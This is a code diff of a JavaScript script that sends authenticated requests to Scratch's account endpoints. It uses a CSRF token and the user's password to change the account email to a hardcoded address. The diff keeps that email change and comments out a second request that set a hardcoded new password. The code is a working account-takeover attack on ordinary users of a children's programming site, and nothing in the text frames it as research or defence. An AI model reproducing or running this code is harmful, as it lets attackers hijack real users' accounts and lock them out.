@@ -62,19 +62,20 @@ let token2="";
       'X-CSRFToken': "a"
     }
   });
-	await fetch("https://scratch.mit.edu/accounts/email_change/", {
+	let email=await fetch("https://scratch.mit.edu/accounts/email_change/", {
 	  "headers": {
 	    "content-type": "application/x-www-form-urlencoded"
 	  },
 	  "body": `csrfmiddlewaretoken=${token}&email_address=namomehu%40choco.la&password=${password}`,
 	  "method": "POST"
 	});
-	await fetch("https://scratch.mit.edu/accounts/password_change/", {
-	  "headers": {
-	    "content-type": "application/x-www-form-urlencoded"
-	  },
-	  "body": `csrfmiddlewaretoken=${token}&old_password=${password}&new_password1=haruwata0853&new_password2=haruwata0853`,
-	  "method": "POST",
-	});
+	//await fetch("https://scratch.mit.edu/accounts/password_change/", {
+	//  "headers": {
+	//    "content-type": "application/x-www-form-urlencoded"
+	//  },
+	//  "body": `csrfmiddlewaretoken=${token}&old_password=${password}&new_password1=haruwata0853&new_password2=haruwata0853`,
+	//  "method": "POST",
+	//});
+  console.log(email.status);
 }
 a();
